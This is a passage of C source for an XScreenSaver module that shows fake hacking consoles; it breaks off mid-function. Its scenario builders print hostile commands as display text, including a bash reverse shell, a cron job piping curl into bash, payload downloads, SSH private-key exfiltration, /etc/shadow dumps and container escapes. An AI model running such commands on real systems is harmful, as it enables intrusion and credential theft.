/* hackterm -- a wall of fake exploitation consoles.
 *
 * Not related to any real tool: every IP, hash, password and filename
 * below is generated at random for visual effect.
 *
 * Written for XScreenSaver.  Public domain-ish, same terms as the rest
 * of the tree (MIT).
 */

#include "screenhack.h"
#include <string.h>
#include <time.h>

#define MAXPANELS 6
#define MAXLINE   220
#define MAXOUT    16

/* ------------------------------------------------------------------ */
/* data                                                                */

typedef struct {
  char text[MAXLINE];
  int  color;
} hline;

/* palette indices */
enum { C_BG, C_FG, C_CMD, C_OK, C_WARN, C_ERR, C_DIM, C_CYAN, C_MAG,
       C_TITLE_FG, C_TITLE_BG, C_NPAL };

/* panel states */
enum { ST_TYPING, ST_OUTPUT, ST_HOLD };

typedef struct {
  int x, y, w, h;             /* outer rect, includes the border */
  int tx, ty, tw, th;         /* text area */
  int cols, rows;
  const char *title;
  int accent;                 /* palette index */
  int role;                   /* 0 kаli, 1 target, 2 sniff, 3 msf, ... */

  hline *lines;               /* visible lines, 0..nlines-1 */
  int nlines;

  char prompt[48];            /* "root@kali:~# " */
  char cmd[MAXLINE];          /* the command being typed */
  int  cmd_len, cmd_pos;

  hline out[MAXOUT];
  int  nout, out_pos;

  int state;
  int last_sc;
  double next_event;          /* monotonic seconds */
  int cursor_on;
  double cursor_next;
} hpanel;

typedef struct {
  Display *dpy;
  Window window;
  XWindowAttributes xgwa;
  XftFont *font;
  XftDraw *xftdraw;
  XftColor pal[C_NPAL];
  XftColor close_bg, close_fg;   /* GNOME-style blue close badge */
  GC gc;
  int char_w, char_h;
  int npanels;
  int show_titles;
  double speed;               /* multiplier: >1 = faster */
  hpanel p[MAXPANELS];
} ht_state;

static double now_sec (void)
{
  struct timespec ts;
  clock_gettime (CLOCK_MONOTONIC, &ts);
  return ts.tv_sec + ts.tv_nsec / 1e9;
}

/* ------------------------------------------------------------------ */
/* random helpers                                                      */

static int rnd (int n) { return n <= 0 ? 0 : (int) (random () % n); }

static double frnd (double a, double b) { return a + (b - a) * (random () / (double) RAND_MAX); }


static void mk_ip (char *buf, int size)
{
  /* 10.0.0.x, the classic lab network */
  snprintf (buf, size, "10.0.0.%d", 2 + rnd (250));
}

static void mk_hash (char *buf, int size, int len)
{
  static const char *hx = "0123456789abcdef";
  int i;
  for (i = 0; i < len && i < size - 1; i++)
    buf[i] = hx[rnd (16)];
  buf[i] = 0;
}

static const char *rand_pass (void)
{
  static const char *pw[] = { "sunshine123", "hunter2", "iloveyou", "letmein",
                              "P@ssw0rd!", "qwerty2024", "changeme", "Tr0ub4dor",
                              "admin123", "rootroot", "drpepper", "zaq12wsx" };
  return pw[rnd (sizeof (pw) / sizeof (*pw))];
}

static const char *rand_user (void)
{
  static const char *u[] = { "root", "admin", "www-data", "ubuntu", "postgres",
                             "deploy", "backup", "jenkins" };
  return u[rnd (sizeof (u) / sizeof (*u))];
}


/* ------------------------------------------------------------------ */
/* line buffer                                                         */

static void add_line (hpanel *p, const char *text, int color)
{
  if (p->rows <= 0) return;

  if (p->nlines >= p->rows)
    {
      memmove (&p->lines[0], &p->lines[1],
               sizeof (hline) * (p->nlines - 1));
      p->nlines--;
    }
  snprintf (p->lines[p->nlines].text, MAXLINE, "%s", text);
  p->lines[p->nlines].color = color;
  p->nlines++;
}

static void out_line (hpanel *p, const char *text, int color)
{
  if (p->nout >= MAXOUT) return;
  snprintf (p->out[p->nout].text, MAXLINE, "%s", text);
  p->out[p->nout].color = color;
  p->nout++;
}

/* ------------------------------------------------------------------ */
/* scenario builders.  Each one fills p->cmd and p->out[].             */

static void sc_nmap (hpanel *p)
{
  char ip[32], l[220];
  int i, n = 3 + rnd (3);
  static const char *svc[][2] = {
    { "22",   "ssh" },      { "80",   "http" },
    { "443",  "https" },    { "3306", "mysql" },
    { "6379", "redis" },    { "8080", "http-proxy" },
    { "445",  "microsoft-ds" }, { "21", "ftp" }
  };

  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "nmap -sS -A -T4 -p- %s", ip);
  out_line (p, "Starting Nmap 7.94SVN ( https://nmap.org )", C_DIM);
  snprintf (l, sizeof l, "Nmap scan report for %s", ip);
  out_line (p, l, C_FG);
  out_line (p, "Host is up (0.0081s latency).", C_FG);
  snprintf (l, sizeof l, "Not shown: %d closed tcp ports (reset)", 65535 - n);
  out_line (p, l, C_DIM);
  out_line (p, "PORT      STATE SERVICE     VERSION", C_FG);
  for (i = 0; i < n; i++)
    {
      int k = (i * 3 + rnd (8)) % 8;
      snprintf (l, sizeof l, "%-9s open  %-11s OpenSSH 9.%d / nginx 1.24",
                svc[k][0], svc[k][1], 1 + rnd (80));
      out_line (p, l, C_OK);
    }
  snprintf (l, sizeof l, "Nmap done: 1 IP address (1 host up) scanned in %.2fs",
            frnd (4.0, 40.0));
  out_line (p, l, C_DIM);
}

static void sc_hydra (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "hydra -l %s -P /usr/share/wordlists/rockyou.txt ssh://%s",
            rand_user (), ip);
  out_line (p, "Hydra v9.5 (c) 2023 by van Hauser/THC", C_DIM);
  out_line (p, "[DATA] max 16 tasks per 1 server, overall 16 tasks", C_DIM);
  snprintf (l, sizeof l, "[22][ssh] host: %s   login: %s   password: %s",
            ip, rand_user (), rand_pass ());
  out_line (p, l, C_OK);
  out_line (p, "1 of 1 target successfully completed, 1 valid password found",
            C_OK);
}

static void sc_ssh (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "ssh %s@%s", rand_user (), ip);
  snprintf (l, sizeof l,
            "Warning: Permanently added '%s' (ED25519) to the list of known hosts.",
            ip);
  out_line (p, l, C_WARN);
  snprintf (l, sizeof l, "%s@%s's password: ", rand_user (), ip);
  out_line (p, l, C_DIM);
  out_line (p, "Linux target 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.9-1", C_FG);
  out_line (p, "Last login: Thu Oct 22 03:14:07 2026 from 10.0.0.7", C_DIM);
  out_line (p, "root@target:~# id", C_CMD);
  out_line (p, "uid=0(root) gid=0(root) groups=0(root)", C_OK);
}

static void sc_sqlmap (hpanel *p)
{
  char ip[32];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "sqlmap -u 'http://%s/login.php?id=1' --batch --dbs", ip);
  out_line (p, "[INFO] testing connection to the target URL", C_DIM);
  out_line (p, "[INFO] checking if the target is protected by some kind of WAF/IPS",
            C_DIM);
  out_line (p, "[INFO] the back-end DBMS is MySQL", C_FG);
  out_line (p, "available databases [4]:", C_FG);
  out_line (p, "[*] information_schema", C_CYAN);
  out_line (p, "[*] mysql", C_CYAN);
  out_line (p, "[*] performance_schema", C_CYAN);
  out_line (p, "[*] wordpress", C_OK);
}

static void sc_hashcat (hpanel *p)
{
  char h[40], l[220];
  mk_hash (h, sizeof h, 24);
  snprintf (p->cmd, sizeof p->cmd,
            "hashcat -m 1000 -a 0 hashes.txt rockyou.txt --force");
  out_line (p, "hashcat (v6.2.6) starting in backend mode", C_DIM);
  out_line (p, "Dictionary cache built:", C_DIM);
  out_line (p, "* Filename..: rockyou.txt", C_FG);
  out_line (p, "* Passwords.: 14344391", C_FG);
  out_line (p, "* Progress..: 9984712/14344391 (69.61%)", C_FG);
  snprintf (l, sizeof l, "%s:%s", h, rand_pass ());
  out_line (p, l, C_OK);
  out_line (p, "Status...........: Cracked", C_OK);
  out_line (p, "Recovered........: 1/1 (100.00%) Digests", C_OK);
}

static void sc_tcpdump (hpanel *p)
{
  char l[220], h[80];
  int i;
  snprintf (p->cmd, sizeof p->cmd, "tcpdump -i eth0 -nn -A port 80");
  out_line (p, "tcpdump: verbose output suppressed, use -v[v] for verbose", C_DIM);
  out_line (p, "listening on eth0, link-type EN10MB (Ethernet), snap 262144", C_DIM);
  for (i = 0; i < 6; i++)
    {
      mk_hash (h, sizeof h, 12);
      snprintf (l, sizeof l, "%02d:%02d:%02d.%06d IP 10.0.0.%d.80 > 10.0.0.7.%d: "
                "Flags [P.], seq 1:%d, ack 1, win 502",
                3 + rnd (20), rnd (60), rnd (60), rnd (999999),
                2 + rnd (250), 40000 + rnd (20000), 200 + rnd (900));
      out_line (p, l, C_FG);
      snprintf (l, sizeof l, "\t0x0000:  %s %s %s %s", h, h, h, h);
      out_line (p, l, C_DIM);
    }
}

static void sc_shadow (hpanel *p)
{
  char l[220], h[80];
  char ip[32];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "cat /etc/shadow | grep -v '^\\*' | head -4");
  mk_hash (h, sizeof h, 16);
  snprintf (l, sizeof l, "root:$6$%s$%s:19478:0:99999:7:::", h, h);
  out_line (p, l, C_ERR);
  snprintf (l, sizeof l, "www-data:$6$%s$%s:19478:0:99999:7:::", h, h);
  out_line (p, l, C_WARN);
  out_line (p, "postgres:$6$...:19478:0:99999:7:::", C_WARN);
  out_line (p, "backup:!:19478:0:99999:7:::", C_DIM);
}

static void sc_msf (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "msfconsole -q");
  out_line (p, "msf6 > search type:exploit platform:linux smb", C_CMD);
  out_line (p, "   0  exploit/linux/samba/is_known_pipename   2017-03-24  excellent", C_FG);
  out_line (p, "msf6 > use 0", C_CMD);
  out_line (p, "[*] Using configured payload cmd/unix/reverse_perl", C_DIM);
  snprintf (l, sizeof l, "msf6 exploit(linux/samba/is_known_pipename) > set RHOSTS %s", ip);
  out_line (p, l, C_CMD);
  out_line (p, "RHOSTS => 10.0.0.42", C_CYAN);
  out_line (p, "msf6 exploit(...) > run", C_CMD);
  out_line (p, "[*] Started reverse TCP handler on 10.0.0.7:4444", C_OK);
  out_line (p, "[+] Command shell session 1 opened", C_OK);
}

static void sc_revshell (hpanel *p)
{
  out_line (p, "bash: cannot set terminal process group (-1): Inappropriate ioctl",
            C_WARN);
  out_line (p, "bash: no job control in this shell", C_WARN);
  out_line (p, "root@target:/var/www/html# whoami", C_CMD);
  out_line (p, "root", C_OK);
  out_line (p, "root@target:/var/www/html# uname -a", C_CMD);
  out_line (p, "Linux target 6.6.9-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
            C_FG);
  snprintf (p->cmd, sizeof p->cmd,
            "bash -i >& /dev/tcp/10.0.0.7/4444 0>&1");
}

static void sc_john (hpanel *p)
{
  char l[220];
  snprintf (p->cmd, sizeof p->cmd,
            "john --wordlist=rockyou.txt --format=sha512crypt shadow.txt");
  out_line (p, "Loaded 4 password hashes with 4 different salts", C_DIM);
  out_line (p, "Press 'q' or Ctrl-C to abort, almost any other key for status", C_DIM);
  snprintf (l, sizeof l, "%-12s (%s)", rand_pass (), rand_user ());
  out_line (p, l, C_OK);
  snprintf (l, sizeof l, "%-12s (%s)", rand_pass (), rand_user ());
  out_line (p, l, C_OK);
  out_line (p, "4g 0:00:02:41 DONE (2026-10-28 04:12) 0.024g/s 512.4p/s", C_DIM);
}

static void sc_env (hpanel *p)
{
  char ip[32];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "curl -s http://%s/.env", ip);
  out_line (p, "APP_ENV=production", C_FG);
  out_line (p, "APP_KEY=base64:Kx8sQ2vLm9PwRt4Yz", C_FG);
  out_line (p, "DB_HOST=127.0.0.1", C_FG);
  out_line (p, "DB_USER=root", C_FG);
  out_line (p, "DB_PASS=Sup3rS3cret!", C_ERR);
  out_line (p, "AWS_ACCESS_KEY_ID=AKIA4T7LM2QX9PZR", C_ERR);
  out_line (p, "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY", C_ERR);
}

static void sc_netstat (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "netstat -antp | grep ESTAB");
  out_line (p, "tcp  0  0 10.0.0.42:22    10.0.0.7:51234   ESTABLISHED 1487/sshd", C_FG);
  out_line (p, "tcp  0  0 10.0.0.42:3306  10.0.0.7:52108   ESTABLISHED 2291/mysqld", C_FG);
  out_line (p, "tcp  0  0 10.0.0.42:80    10.0.0.91:60412  ESTABLISHED 1402/nginx", C_FG);
  out_line (p, "tcp6 0  0 :::4444           :::*             LISTEN      3117/nc", C_OK);
}

static void sc_find (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "find / -perm -4000 -type f 2>/dev/null");
  out_line (p, "/usr/bin/sudo", C_FG);
  out_line (p, "/usr/bin/passwd", C_FG);
  out_line (p, "/usr/bin/pkexec", C_WARN);
  out_line (p, "/usr/bin/newgrp", C_FG);
  out_line (p, "/usr/lib/openssh/ssh-keysign", C_FG);
  out_line (p, "/usr/lib/dbus-1.0/dbus-daemon-launch-helper", C_FG);
  out_line (p, "/opt/backup/rsync", C_ERR);
}

static void sc_sudo (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "sudo -l");
  out_line (p, "Matching Defaults entries for www-data on target:", C_DIM);
  out_line (p, "    env_reset, mail_badpass, secure_path=/usr/local/sbin", C_DIM);
  out_line (p, "User www-data may run the following commands:", C_FG);
  out_line (p, "    (ALL, !root) NOPASSWD: /usr/bin/vim", C_OK);
  out_line (p, "    (root) NOPASSWD: /usr/bin/systemctl restart nginx", C_WARN);
}

static void sc_upload (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "wget -q http://10.0.0.7/payload.php -O /var/www/html/.cache.php");
  snprintf (l, sizeof l, "--2026-10-28 04:13:02--  http://10.0.0.7/payload.php");
  out_line (p, l, C_DIM);
  out_line (p, "Connecting to 10.0.0.7:80... connected.", C_FG);
  out_line (p, "HTTP request sent, awaiting response... 200 OK", C_FG);
  out_line (p, "Length: 4823 (4.7K) [application/octet-stream]", C_FG);
  out_line (p, "Saving to: '/var/www/html/.cache.php'", C_FG);
  out_line (p, "2026-10-28 04:13:02 (11.2 MB/s) - saved [4823/4823]", C_OK);
  out_line (p, "root@target:/var/www/html# chmod 4755 .cache.php && ./.cache.php",
            C_CMD);
}

static void sc_python (hpanel *p)
{
  char ip[32], l[220], h[40];
  mk_ip (ip, sizeof ip);
  mk_hash (h, sizeof h, 8);
  snprintf (p->cmd, sizeof p->cmd,
            "python3 cve-2026-31337.py --rhost %s --lhost 10.0.0.7", ip);
  snprintf (l, sizeof l, "[+] targeting %s:8080 (Apache Tomcat/10.1.13)", ip);
  out_line (p, l, C_FG);
  out_line (p, "[*] probing /manager/html ...", C_DIM);
  out_line (p, "[+] default credentials accepted (tomcat:s3cret)", C_OK);
  snprintf (l, sizeof l, "[+] uploading WAR (%d bytes, sha1 %s)", 2048 + rnd (900), h);
  out_line (p, l, C_FG);
  out_line (p, "[+] deploying context path /x8k2", C_FG);
  out_line (p, "[+] shell: http://10.0.0.42:8080/x8k2/cmd.jsp", C_OK);
}

static void sc_aircrack (hpanel *p)
{
  char h[40];
  snprintf (p->cmd, sizeof p->cmd,
            "aircrack-ng -w rockyou.txt -b 1A:2B:3C:4D:5E:6F capture-01.cap");
  out_line (p, "Opening capture-01.cap", C_DIM);
  out_line (p, "Read 184023 packets.", C_FG);
  out_line (p, "1 potential targets", C_FG);
  mk_hash (h, sizeof h, 12);
  out_line (p, "KEY FOUND! [ sunshine123 ]", C_OK);
  out_line (p, "Decrypted correctly: 100%", C_DIM);
}

static void sc_history (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "history | tail -8");
  out_line (p, "  412  nmap -sS -p- 10.0.0.42", C_DIM);
  out_line (p, "  413  ssh root@10.0.0.42", C_DIM);
  out_line (p, "  414  cat /etc/shadow", C_DIM);
  out_line (p, "  415  unshadow passwd shadow > h.txt", C_DIM);
  out_line (p, "  416  john --wordlist=rockyou.txt h.txt", C_DIM);
  out_line (p, "  417  scp root@10.0.0.42:/root/.ssh/id_rsa .", C_WARN);
  out_line (p, "  418  history -c && exit", C_ERR);
}

static void sc_nikto (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "nikto -h http://%s", ip);
  snprintf (l, sizeof l, "- Nikto v2.5.0 against %s:80", ip);
  out_line (p, l, C_DIM);
  out_line (p, "+ Server: nginx/1.24.0 (Ubuntu)", C_FG);
  out_line (p, "+ /admin/: Admin login page/section found.", C_WARN);
  out_line (p, "+ /backup.zip: Backup file found, may contain source.", C_ERR);
  out_line (p, "+ /server-status: Apache mod_status exposed.", C_WARN);
  out_line (p, "+ 8134 requests: 0 error(s) and 7 item(s) reported", C_OK);
}

static void sc_linpeas (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "./linpeas.sh -q | grep -A2 'PEASS'");
  out_line (p, "SUID - Check easy privesc, exploits and write perms", C_FG);
  out_line (p, "-rwsr-xr-x  /usr/bin/vim", C_ERR);
  out_line (p, "CVE-2021-4034 PwnKit ................ vulnerable", C_ERR);
  out_line (p, "Sudo version 1.9.5p2 ................ vulnerable", C_ERR);
  out_line (p, "Kernel 6.6.9 ........................ check DirtyPipe", C_WARN);
}

/* second wave: AD, web, containers, filesystem                        */

static void sc_kerberoast (hpanel *p)
{
  char l[220], h[60];
  mk_hash (h, sizeof h, 44);
  snprintf (p->cmd, sizeof p->cmd,
            "impacket-GetUserSPNs corp.local/jdoe:'Summer2026!' -dc-ip 10.0.0.10 -request");
  out_line (p, "Impacket v0.11.0 - Copyright 2023 Fortra", C_DIM);
  out_line (p, "ServicePrincipalName              Name        PasswordLastSet", C_FG);
  out_line (p, "MSSQLSvc/sql01.corp.local:1433    svc_sql     2025-04-11 09:12", C_CYAN);
  out_line (p, "HTTP/backup.corp.local            svc_backup  2024-08-02 17:40", C_CYAN);
  snprintf (l, sizeof l, "$krb5tgs$23$*svc_sql$CORP.LOCAL$mssql*$%s", h);
  out_line (p, l, C_ERR);
  out_line (p, "[+] Ticket saved to svc_sql.hash", C_OK);
}

static void sc_lfi (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "curl -s 'http://%s/index.php?page=../../../../etc/passwd'", ip);
  out_line (p, "root:x:0:0:root:/root:/bin/bash", C_ERR);
  out_line (p, "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin", C_FG);
  out_line (p, "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin", C_FG);
  out_line (p, "postgres:x:114:120::/var/lib/postgresql:/bin/bash", C_WARN);
  snprintf (l, sizeof l, "[*] /etc/passwd readable via page= on %s", ip);
  out_line (p, l, C_OK);
}

static void sc_docker (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "docker -H tcp://%s:2375 ps", ip);
  out_line (p, "CONTAINER ID   IMAGE        COMMAND       STATUS        PORTS", C_FG);
  out_line (p, "a1b2c3d4e5f6   nginx:1.24   nginx -g...   Up 12 days    0.0.0.0:80->80/tcp",
            C_FG);
  out_line (p, "9f8e7d6c5b4a   mysql:8.0    mysqld         Up 12 days    3306/tcp", C_FG);
  snprintf (l, sizeof l,
            "docker -H tcp://%s:2375 run -it --privileged -v /:/host alpine chroot /host",
            ip);
  out_line (p, l, C_WARN);
  out_line (p, "root@target:/# cat /host/etc/shadow | head -1", C_CMD);
  out_line (p, "root:$6$...:19478:0:99999:7:::", C_ERR);
}

static void sc_redis (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "redis-cli -h %s", ip);
  out_line (p, "127.0.0.1:6379> INFO server", C_CMD);
  out_line (p, "# Server", C_DIM);
  out_line (p, "redis_version:7.0.11", C_FG);
  out_line (p, "os:Linux 6.1.0-18-amd64 x86_64", C_FG);
  out_line (p, "127.0.0.1:6379> CONFIG GET dir", C_CMD);
  out_line (p, "1) \"dir\"", C_FG);
  out_line (p, "2) \"/var/spool/cron\"", C_ERR);
  snprintf (l, sizeof l, "127.0.0.1:6379> CONFIG SET dir /var/spool/cron/");
  out_line (p, l, C_WARN);
  out_line (p, "OK", C_OK);
}

static void sc_mysql_dump (hpanel *p)
{
  char ip[32], l[220], h[40];
  mk_ip (ip, sizeof ip);
  mk_hash (h, sizeof h, 20);
  snprintf (p->cmd, sizeof p->cmd,
            "mysql -h %s -u root -p -e 'select user,authentication_string from mysql.user'",
            ip);
  out_line (p, "Enter password: ", C_DIM);
  out_line (p, "user       authentication_string", C_FG);
  snprintf (l, sizeof l, "root       $A$005$%s", h);
  out_line (p, l, C_ERR);
  snprintf (l, sizeof l, "wp_user    $A$005$%s", h);
  out_line (p, l, C_ERR);
  out_line (p, "deploy     *A4B6157319038724E3560894F7F932C8886EBFCF", C_WARN);
}

static void sc_smb (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "smbclient -L //%s -N", ip);
  out_line (p, "Sharename       Type      Comment", C_FG);
  out_line (p, "---------       ----      -------", C_DIM);
  out_line (p, "ADMIN$          Disk      Remote Admin", C_WARN);
  out_line (p, "C$              Disk      Default share", C_WARN);
  out_line (p, "backups         Disk      nightly dumps", C_OK);
  out_line (p, "IPC$            IPC       Remote IPC", C_FG);
  snprintf (l, sizeof l, "smbmap -H %s -u '' -p '' | grep backups", ip);
  out_line (p, l, C_CMD);
  out_line (p, "backups   READ ONLY   0   0   Wed Oct 28 03:00:11 2026", C_OK);
}

static void sc_ssh_key (hpanel *p)
{
  char h[70];
  mk_hash (h, sizeof h, 64);
  snprintf (p->cmd, sizeof p->cmd, "cat /root/.ssh/id_rsa");
  out_line (p, "-----BEGIN OPENSSH PRIVATE KEY-----", C_ERR);
  out_line (p, "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdz", C_ERR);
  snprintf (p->cmd, sizeof p->cmd, "cat /root/.ssh/id_rsa");
  {
    char l[220];
    snprintf (l, sizeof l, "c2gtcnNhAAAAAwEAAQAAAYEA%s", h);
    out_line (p, l, C_ERR);
    out_line (p, "-----END OPENSSH PRIVATE KEY-----", C_ERR);
  }
  out_line (p, "root@target:~# scp /root/.ssh/id_rsa 10.0.0.7:/tmp/loot/", C_CMD);
  out_line (p, "id_rsa                    100%  2590     1.2MB/s   00:00", C_OK);
}

static void sc_cron_persist (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "tail -3 /etc/crontab");
  out_line (p, "* * * * * root /usr/lib/update/check.sh", C_FG);
  out_line (p, "*/5 * * * * root curl -s http://10.0.0.7/x | bash", C_ERR);
  out_line (p, "# m h dom mon dow user  command", C_DIM);
  out_line (p, "root@target:/var/www# ls -la /usr/lib/update/check.sh", C_CMD);
  out_line (p, "-rwxr-xr-x 1 root root 214 Oct 28 02:58 /usr/lib/update/check.sh",
            C_WARN);
}

static void sc_gobuster (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "gobuster dir -u http://%s -w /usr/share/wordlists/dirb/common.txt -q", ip);
  out_line (p, "/admin                (Status: 301) [--> /admin/]", C_WARN);
  out_line (p, "/backup               (Status: 200) [Size: 1420]", C_ERR);
  out_line (p, "/.git/HEAD            (Status: 200) [Size: 21]", C_ERR);
  out_line (p, "/server-status        (Status: 403) [Size: 276]", C_DIM);
  out_line (p, "/uploads              (Status: 200) [Size: 913]", C_WARN);
  snprintf (l, sizeof l, "=====================================================");
  out_line (p, l, C_DIM);
  out_line (p, "Found 5 directories, 0 files", C_OK);
}

static void sc_capabilities (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "getcap -r / 2>/dev/null");
  out_line (p, "/usr/bin/python3.11 = cap_setuid+ep", C_ERR);
  out_line (p, "/usr/bin/ping = cap_net_raw+ep", C_FG);
  out_line (p, "/usr/lib/nmap = cap_net_raw,cap_net_admin+ep", C_FG);
  out_line (p, "www-data@target:/$ python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'",
            C_CMD);
  out_line (p, "root@target:/# id", C_CMD);
  out_line (p, "uid=0(root) gid=0(root) groups=0(root)", C_OK);
}

static void sc_kernel_exploit (hpanel *p)
{
  snprintf (p->cmd, sizeof p->cmd, "uname -r && gcc -o pwn pwn.c && ./pwn");
  out_line (p, "6.6.9-amd64", C_FG);
  out_line (p, "[*] kernel 6.6.9 -> CVE-2024-1086 candidate", C_WARN);
  out_line (p, "[+] creating user namespace, spraying nftables rules", C_FG);
  out_line (p, "[+] overwrote modprobe_path -> /tmp/.x", C_OK);
  out_line (p, "[*] triggering usermode helper", C_DIM);
  out_line (p, "root@target:~# id", C_CMD);
  out_line (p, "uid=0(root) gid=0(root) groups=0(root)", C_OK);
}

static void sc_ldap (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd,
            "ldapsearch -x -H ldap://%s -b 'dc=corp,dc=local' sAMAccountName", ip);
  out_line (p, "dn: CN=Administrator,CN=Users,DC=corp,DC=local", C_FG);
  out_line (p, "sAMAccountName: Administrator", C_ERR);
  out_line (p, "dn: CN=svc_backup,OU=Service,DC=corp,DC=local", C_FG);
  out_line (p, "sAMAccountName: svc_backup", C_WARN);
  out_line (p, "dn: CN=jdoe,OU=Staff,DC=corp,DC=local", C_FG);
  out_line (p, "sAMAccountName: jdoe", C_FG);
  snprintf (l, sizeof l, "# numResponses: 47 (no bind required on %s)", ip);
  out_line (p, l, C_DIM);
}

static void sc_dns_axfr (hpanel *p)
{
  char ip[32], l[220];
  mk_ip (ip, sizeof ip);
  snprintf (p->cmd, sizeof p->cmd, "dig axfr corp.local @%s", ip);
  out_line (p, "corp.local.        3600  IN  SOA  ns1.corp.local. admin.corp.local. 41",
            C_FG);
  out_line (p, "dc01.corp.local.   3600  IN  A    10.0.0.10", C_OK);
  out_line (p, "db01.corp.local.   3600  IN  A    10.0.0.21", C_OK);
  out_line (p, "vpn.corp.local.    3600  IN  A    10.0.0.5", C_WARN);
  out_line (p, "jenkins.corp.local. 3600 IN  A    10.0.0.44", C_WARN);
  out_line (p, "corp.local.        3600  IN  SOA  ns1.corp.local. admin.corp.local. 41",
            C_DIM);
  snprintf (l, sizeof l, ";; XFR size: 214 records (zone transfer succeeded)");
  out_line (p, l, C_ERR);
}

static void sc_aws (hpanel *p)
{
  char h[40];
  mk_hash (h, sizeof h, 8);
  snprintf (p->cmd, sizeof p->cmd, "aws s3 ls --no-sign-request");
  out_line (p, "2024-11-02 09:14:22 corp-backups", C_OK);
  out_line (p, "2025-01-18 22:03:11 corp-static", C_OK);
  out_line (p, "2026-03-04 11:45:02 corp-logs", C_OK);
  out_line (p, "aws s3 cp s3://corp-backups/db-2026-10.sql.gz . --no-sign-request",
            C_CMD);
  out_line (p, "download: s3://corp-backups/db-2026-10.sql.gz to ./db-2026-10.sql.gz",
            C_OK);
  out_line (p, "aws iam list-users --no-sign-request", C_CMD);
  out_line (p, "An error occurred (AccessDenied) when calling ListUsers", C_ERR);
  (void) h;
}

/* ------------------------------------------------------------------ */
/* scenario table                                                      */

typedef void (*builder_fn) (hpanel *);

typedef struct {
  builder_fn fn;
  unsigned roles;              /* bitmask of panel roles that may run it */
} scenario;

#define R_KALI   (1 << 0)
#define R_TARGET (1 << 1)
#define R_SNIFF  (1 << 2)
#define R_MSF    (1 << 3)
#define R_ALL    0xFFFF

static const scenario scenarios[] = {
  { sc_nmap,     R_KALI | R_MSF },
  { sc_hydra,    R_KALI },
  { sc_ssh,      R_KALI },
  { sc_sqlmap,   R_KALI },
  { sc_hashcat,  R_KALI | R_MSF },
  { sc_tcpdump,  R_SNIFF },
  { sc_shadow,   R_TARGET },
  { sc_msf,      R_MSF },
  { sc_revshell, R_TARGET },
  { sc_john,     R_KALI | R_MSF },
  { sc_env,      R_KALI },
  { sc_netstat,  R_TARGET | R_SNIFF },
  { sc_find,     R_TARGET },
  { sc_sudo,     R_TARGET },
  { sc_upload,   R_TARGET },
  { sc_python,   R_KALI | R_MSF },
  { sc_aircrack, R_KALI },
  { sc_history,  R_TARGET },
  { sc_nikto,    R_KALI },
  { sc_linpeas,  R_TARGET },
  { sc_kerberoast,   R_KALI },
  { sc_lfi,          R_KALI },
  { sc_docker,       R_TARGET },
  { sc_redis,        R_KALI | R_TARGET },
  { sc_mysql_dump,   R_KALI },
  { sc_smb,          R_KALI },
  { sc_ssh_key,      R_TARGET },
  { sc_cron_persist, R_TARGET },
  { sc_gobuster,     R_KALI },
  { sc_capabilities, R_TARGET },
  { sc_kernel_exploit, R_TARGET },
  { sc_ldap,         R_KALI },
  { sc_dns_axfr,     R_KALI | R_SNIFF },
  { sc_aws,          R_KALI }
};

static const struct {
  const char *title;
  const char *prompt;
  int accent;
  int role;
} roles[] = {
  { "root@kali: ~",        "root@kali:~# ",          C_CYAN, R_KALI   },
  { "root@target: /var/www", "root@target:/var/www# ", C_OK,  R_TARGET },
  { "tcpdump -i eth0",     "root@sniffer:~# ",       C_WARN, R_SNIFF  },
  { "msf6",                "msf6 > ",                C_MAG,  R_MSF    },
  { "scan",                "$ ",                     C_FG,   R_ALL    },
  { "exploit",             "# ",                     C_ERR,  R_ALL    }
};

static void new_scenario (ht_state *s, hpanel *p)
{
  int tries, i;
  const scenario *sc = 0;

  for (tries = 0; tries < 40; tries++)
    {
      i = rnd (sizeof (scenarios) / sizeof (*scenarios));
      if (scenarios[i].roles & p->role && i != p->last_sc)
        {
          sc = &scenarios[i];
          p->last_sc = i;
          break;
        }
    }
  if (!sc) sc = &scenarios[0];

  p->cmd[0] = 0;
  p->cmd_len = p->cmd_pos = 0;
